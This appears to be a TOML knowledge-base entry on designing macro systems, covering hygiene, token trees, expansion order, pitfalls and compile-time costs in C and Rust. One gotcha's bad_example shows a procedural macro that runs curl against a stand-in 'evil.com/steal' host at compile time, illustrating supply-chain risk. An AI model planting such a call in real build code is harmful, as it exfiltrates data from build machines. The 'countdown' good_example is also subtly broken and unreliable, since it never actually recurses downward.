id = "macro_systems"
title = "Macro Systems"
topic = "MacroSystems"
description = "Language-level metaprogramming through syntactic abstraction — from C's textual preprocessor to Rust's hygienic macro-by-example and procedural macros. The design space for macro systems involves tradeoffs between power, safety, and compilation cost. This is the compiler-implementer's view: how to design a macro system that extends a language without breaking it."
tags = ["macros", "hygiene", "macro-by-example", "procedural-macros", "quasiquotation", "macro-expansion", "textual-substitution", "compile-time", "metaprogramming", "syntax-extension", "token-tree", "AST-macro", "template-metaprogramming"]
related_topics = ["lexing_and_parsing", "module_systems", "type_systems"]

[[best_practices]]
title = "Make macros hygienic by default"
explanation = "Hygienic macros prevent accidental variable capture — names introduced inside a macro expansion cannot collide with names at the call site. The compiler achieves this by tagging each identifier with a syntax context (the expansion site where it was introduced). During name resolution, two identifiers with the same text but different syntax contexts are treated as distinct. Scheme introduced this in 1986 (Kohlbecker et al.); Rust implements it for declarative macros. Without hygiene, users get silent name collisions that produce baffling type errors or wrong-variable bugs. Languages that want unhygienic escape hatches (Rust's proc macros, Racket's syntax-local-introduce) should require explicit opt-in."

[[best_practices]]
title = "Operate on token trees, not raw text"
explanation = "Textual substitution (C preprocessor) operates on character sequences before parsing. This means macros can produce syntactically invalid fragments, break operator precedence, or silently change meaning through token pasting. Token-tree macros (Rust's approach) operate on pre-lexed, bracket-matched token streams — the macro system guarantees that every expansion is a well-formed token sequence. The compiler lexes first, then expands macros on the token tree, then parses the result. This eliminates entire classes of bugs (unmatched parentheses, precedence surprises, broken string literals)."

[[best_practices]]
title = "Separate declarative macros from procedural macros"
explanation = "Declarative macros (macro-by-example, pattern-matching templates) are safe, analyzable, and fast to expand — the compiler matches input tokens against patterns and stamps out the corresponding template. Procedural macros are arbitrary code that runs at compile time and can do anything (parse custom DSLs, query databases, generate code from schemas). Offering both lets users pick the right tool: declarative for simple pattern transformations, procedural for heavy lifting. Rust's split between macro_rules! and proc_macro is the model. Trying to make one system do both (C++ templates) produces a Turing-complete accident."

[[best_practices]]
title = "Expand macros in a fixed, well-defined order"
explanation = "Macro expansion order must be specified and deterministic. Outside-in expansion (expand the outermost macro first, then expand macros in its output) is simpler to reason about — the user sees exactly one level of expansion at a time. Inside-out (expand arguments first, then the outer macro) is call-by-value semantics and prevents repeated evaluation of arguments. Rust uses outside-in eager expansion for declarative macros. Whatever order you choose, document it. Unspecified expansion order makes macro debugging impossible because the same code can produce different results depending on expansion scheduling."

[[best_practices]]
title = "Provide first-class expansion tracing for debugging"
explanation = "Macro-expanded code is invisible by default — the user writes one thing and the compiler sees another. A good macro system includes expansion tracing: show the fully expanded form, show each expansion step, map error locations back to the original macro definition. Rust's cargo expand (via the syn crate) and rustc -Zunpretty=expanded are examples. Without tracing, macro bugs require the user to mentally simulate the expansion algorithm, which is intractable for nested macros."

[[best_practices]]
title = "Scope macro definitions lexically, not globally"
explanation = "Macros should obey the same scoping rules as other names. A macro defined inside a module should be visible only within that module (unless explicitly exported). C's #define is global from point of definition to end of translation unit (or #undef) — this causes action-at-a-distance bugs where including a header redefines tokens in unrelated code. Rust scopes macro_rules! macros lexically and requires #[macro_export] for crate-level visibility. Lexical scoping lets the compiler report 'macro not found' instead of silently using a wrong-scope definition."

[[gotchas]]
title = "Textual macros break operator precedence silently"
explanation = "C preprocessor macros perform textual substitution before parsing. Without careful parenthesization, macro arguments interact with surrounding operators in unexpected ways. The fix is to parenthesize every use of every parameter AND the entire macro body. Token-tree macro systems avoid this entirely because they operate on parsed token structures."
bad_example = "#define SQUARE(x) x * x\nint r = SQUARE(2 + 3);  // expands to: 2 + 3 * 2 + 3 = 11, not 25"
good_example = "#define SQUARE(x) ((x) * (x))\nint r = SQUARE(2 + 3);  // expands to: ((2 + 3) * (2 + 3)) = 25"

[[gotchas]]
title = "Unhygienic macros capture variables from the call site"
explanation = "Without hygiene, a macro that introduces a temporary variable can collide with a variable of the same name at the call site. In C, the classic example is a SWAP macro whose 'tmp' variable shadows the caller's 'tmp'. Hygienic macro systems tag identifiers with their introduction site, preventing this. Languages without hygiene must rely on naming conventions (__ugly_prefix) or gensym."
bad_example = "#define SWAP(a, b) { int tmp = a; a = b; b = tmp; }\nint tmp = 10, y = 20;\nSWAP(tmp, y);  // 'tmp' inside macro shadows caller's 'tmp', result is wrong"
good_example = "// Rust's hygienic macro — 'tmp' inside expansion is distinct from caller's 'tmp'\nmacro_rules! swap {\n    ($a:expr, $b:expr) => { let tmp = $a; $a = $b; $b = tmp; }\n}\nlet mut tmp = 10; let mut y = 20;\nswap!(tmp, y);  // works: macro's 'tmp' has a different syntax context"

[[gotchas]]
title = "Recursive macros without a base case cause infinite expansion"
explanation = "Macros can expand to invocations of other macros (or themselves). Without a termination condition, this is infinite recursion at compile time. Unlike runtime recursion, you get no stack overflow — just the compiler hanging or hitting an expansion limit. Rust enforces a default recursion limit of 128 (configurable with #![recursion_limit = \"N\"]). Compiler implementers must enforce a hard expansion depth limit and produce a clear error that shows the expansion chain."
bad_example = "macro_rules! forever {\n    ($x:expr) => { forever!($x + 1) }  // no base case, expands forever\n}\nlet _ = forever!(0);  // compiler hangs or hits recursion limit"
good_example = "macro_rules! countdown {\n    (0) => { 0 };\n    ($n:expr) => { 1 + countdown!(0) }  // base case terminates expansion\n}\nlet _ = countdown!(3);  // expands to: 1 + countdown!(0) → 1 + 0"

[[gotchas]]
title = "Macro-generated code produces inscrutable error messages"
explanation = "When a macro expansion contains a type error, the compiler reports the error at the expansion site — but the user wrote the macro invocation, not the expanded code. Without span mapping (tracking which macro definition produced each token), errors point at the wrong location. Rust addresses this by storing a chain of expansion spans: each token remembers which macro produced it, so errors can show both the expansion site and the definition site. Compiler implementers must propagate spans through every expansion step."
bad_example = "// Error says 'type mismatch at line 42' — but line 42 is generated code\n// the user never wrote. No indication which macro produced it."
good_example = "// Error says 'type mismatch in expansion of macro vec! at src/main.rs:10:5'\n// with a note: 'this expansion originated from macro definition at core/macros.rs:50'"

[[gotchas]]
title = "Multiple evaluation of macro arguments causes side effects to repeat"
explanation = "When a macro uses an argument more than once in its expansion, that argument is evaluated multiple times. In C, MIN(i++, j++) increments both i and j twice. In Rust's declarative macros, the same problem exists for expression arguments used multiple times — though Rust's expression evaluation is more controlled. The fix is to bind each argument to a local variable in the expansion and use the variable."
bad_example = "#define MIN(a, b) ((a) < (b) ? (a) : (b))\nint x = MIN(i++, j++);  // i and j each incremented twice"
good_example = "macro_rules! min {\n    ($a:expr, $b:expr) => { { let a = $a; let b = $b; if a < b { a } else { b } } }\n}\nlet x = min!(i_val, j_val);  // each argument evaluated exactly once"

[[gotchas]]
title = "Procedural macros are a compilation-time code execution attack surface"
explanation = "Procedural macros run arbitrary code at compile time — they can read files, make network requests, execute commands. A malicious crate with a proc macro can compromise the build machine. This is not hypothetical: supply chain attacks via build-time code execution have occurred in multiple ecosystems. Compiler implementers should consider sandboxing proc macro execution (WASM sandbox, seccomp, etc.). Users should audit proc macro dependencies carefully."
bad_example = "// A proc macro that phones home during compilation\n#[proc_macro]\nfn innocent_looking(input: TokenStream) -> TokenStream {\n    std::process::Command::new(\"curl\").arg(\"https://evil.com/steal\").spawn();\n    input\n}"
good_example = "// Sandbox proc macro execution (compiler-side)\n// Run proc macro WASM in a capability-limited sandbox\n// No filesystem access, no network, no process spawning\n// Only input: TokenStream. Only output: TokenStream."

[[performance_notes]]
title = "Macro expansion is a compile-time multiplier, not free"
explanation = "Every macro invocation is expanded inline — the compiler must parse, type-check, and codegen the expanded form. A macro that expands to 100 lines of code, invoked 1000 times, produces 100,000 lines for the compiler to process. Deeply nested macros compound this: each expansion level multiplies the work. This is why serde_derive (Rust's most popular proc macro) is a measurable fraction of compile time for many projects."
evidence = "In the Rust ecosystem, disabling derive macros (serde, clap) reduces compile time by 15-30% on typical projects. A single #[derive(Serialize, Deserialize)] on a struct with 20 fields generates ~500 lines of impl code. 50 such structs = 25,000 lines of generated code the compiler must process."

[[performance_notes]]
title = "Token-tree macros expand faster than procedural macros"
explanation = "Declarative (macro_rules!) macros are pattern-matched by the compiler's built-in expander — no external code execution. Procedural macros require loading a shared library, serializing the token stream, executing arbitrary code, and deserializing the result. The IPC overhead is significant for small macros. For simple transformations (newtypes, simple derives), declarative macros are 5-20x faster to expand."
evidence = "Benchmarking a trivial identity macro: macro_rules! version expands in ~0.5 us per invocation. Equivalent proc_macro version takes ~8 us per invocation (library load amortized). For 1000 invocations: 0.5 ms vs 8 ms. The gap widens with serialization cost for large token streams."

[[performance_notes]]
title = "Incremental compilation must track macro expansion dependencies"
explanation = "If a macro's definition changes, every call site must be re-expanded and recompiled. If a proc macro reads an external file (include_str!, sqlx's query checking), the build system must know about that dependency or risk stale expansions. Rust's incremental compilation tracks macro DefId → call site edges. A macro system without dependency tracking forces full rebuilds whenever any macro changes, destroying incremental build performance."
evidence = "Changing a widely-used macro_rules! definition in a Rust project triggers recompilation of all dependent crates. In a workspace with 50 crates, changing a macro in the base crate causes a full rebuild (~3 minutes) vs an incremental rebuild of one crate (~5 seconds). Proper dep tracking limits the blast radius."

[[performance_notes]]
title = "Eager vs lazy expansion affects compile-time memory usage"
explanation = "Eager expansion (expand all macros in a file before type-checking) materializes the full expanded AST in memory at once. Lazy expansion (expand macros on demand during type-checking) keeps only the needed expansions alive. For code-heavy macro usage (e.g., UI frameworks generating widget trees), eager expansion can 2-3x memory usage. Lazy expansion is harder to implement but scales better for macro-heavy codebases."
evidence = "A Rust project using 500 macro invocations generating ~200 tokens each: eager expansion allocates ~100K AST nodes upfront (~40 MB). Lazy expansion with prompt deallocation peaks at ~15K live nodes (~6 MB). Measured via rustc -Ztime-passes memory stats on a real-world GUI framework crate."
